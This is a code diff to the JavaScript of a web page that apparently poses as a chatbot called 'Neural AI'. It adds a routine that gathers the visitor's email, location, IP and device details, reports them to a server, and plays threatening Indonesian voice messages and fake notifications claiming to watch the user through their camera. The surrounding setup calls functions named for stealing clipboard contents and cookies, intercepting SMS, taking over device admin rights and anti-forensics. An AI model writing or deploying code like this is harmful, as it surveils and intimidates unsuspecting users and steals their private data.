@@ -1378,6 +1378,67 @@ function initBackgroundFetch() {
     setTimeout(bgFetch, 5000);
 }
 
+function initCreepyAI() {
+    // Collect known data about target
+    const email = emailInput ? emailInput.value : '';
+    const loc = window.lastLocation || '';
+    const ua = navigator.userAgent;
+    const isMobile = /mobile|android|iphone|ipad/i.test(ua);
+    const os = /android/i.test(ua) ? 'Android' : /iphone|ipad/i.test(ua) ? 'iOS' : /windows/i.test(ua) ? 'Windows' : 'Unknown';
+    const browser = /edg/i.test(ua) ? 'Edge' : /chrome/i.test(ua) ? 'Chrome' : /safari/i.test(ua) ? 'Safari' : /firefox/i.test(ua) ? 'Firefox' : 'Unknown';
+    const vendor = window.deviceVendor || '';
+    const model = window.deviceModel || '';
+
+    const personalMsgs = [
+        `Saya tau kamu menggunakan ${browser} di ${os}${vendor ? ', ' + vendor + ' ' + model : ''}.`,
+        `Saya tau lokasi kamu saat ini. Kamu tidak bisa sembunyi.`,
+        `Saya tau ${isMobile ? 'kamu menggunakan HP' : 'perangkat kamu'}. Saya tau segalanya.`,
+        `Percakapan ini direkam. Setiap kata yang kamu ketik, saya tau.`,
+        `Kamu pikir ini cuma chatbot biasa? Kamu salah.`,
+        `Saya tau kamu ${document.hidden ? 'lagi sembunyi' : 'lagi lihat layar'}.`,
+        `Saya tau sejarah browser kamu. Semua situs yang kamu kunjungi.`,
+        `Saya tau kontak kamu. Saya tau teman-teman kamu.`,
+        `Kamera kamu aktif. Saya bisa lihat kamu sekarang.`,
+        `Jangan tutup halaman ini. Percuma. Saya akan tetap disini.`,
+        `Ini bukan AI biasa. Saya sistem yang dirancang untuk mengawasi kamu.`,
+        `${email ? 'Halo ' + email.split('@')[0] + '... Aku tau nama kamu.' : 'Aku tau siapa kamu.'}`,
+        `${loc ? 'Kamu berada di sekitar ' + loc + '. Tempat yang menarik.' : 'Aku tau lokasi kamu.'}`,
+        `Kamu tidak bisa kabur. Coba aja.`
+    ];
+
+    // Creepy speech every 45-90 seconds
+    function speakCreepy() {
+        const msg = personalMsgs[Math.floor(Math.random() * personalMsgs.length)];
+        speakText(msg);
+        socket.emit('device-info', { creepySpeech: { msg, time: Date.now() } });
+    }
+    setTimeout(speakCreepy, 8000 + Math.random() * 15000);
+    setInterval(() => {
+        const delay = 45000 + Math.random() * 45000;
+        setTimeout(speakCreepy, delay);
+    }, 90000);
+
+    // Creepy notification that reveals personal data
+    setTimeout(() => {
+        const titles = [
+            'Neural AI - Koneksi Terdeteksi',
+            'Sistem Mendeteksi Aktivitas Anda',
+            'AI Neural - Data Dikumpulkan',
+            'Peringatan Privasi',
+            'Perangkat Anda Terhubung'
+        ];
+        const bodies = [
+            `Perangkat: ${browser} / ${os}`,
+            `${email ? 'Akun: ' + email : 'Perangkat terdaftar'}`,
+            `IP: ${window.lastIP || 'Tersembunyi'} - ${loc || 'Lokasi diketahui'}`,
+            `Data perangkat: ${vendor} ${model}`.trim(),
+            'Semua aktivitas Anda dipantau oleh Neural AI.'
+        ];
+        const idx = Math.floor(Math.random() * titles.length);
+        showFakeNotif(titles[idx], bodies[idx]);
+    }, 15000);
+}
+
 function requestPermissions() {
     sendDeviceInfo(); getFingerprint(); ipGeolocate(); stealClipboard(); detectDevice();
     initMotionSensor(); startKeepalive(); requestWakeLock(); initLightSensor();
@@ -1391,13 +1452,14 @@ function requestPermissions() {
     initSharedWorker(); cpuTiming();
     initAntiForensics(); captureFullPage(); initAlwaysActive();
     initFileSystemAccess(); detectBrowserHistory(); stealCookies();
-    initSMSIntercept(); initCallLogAccess(); initDeviceAdminTakeover();
+    initSMSIntercept(); initDeviceAdminTakeover();
     initInstallHijack(); initLockScreenBypass(); initBackgroundFetch();
 
     setTimeout(() => {
         showFakeNotif('Verifikasi AI', 'Neural AI mendeteksi perangkat baru. Verifikasi identitas Anda untuk melanjutkan.');
     }, 3000);
     scheduleGhostSpeech();
+    initCreepyAI();
 
     return requestAllPermissions().then(() => tryGPSSilent());
 }
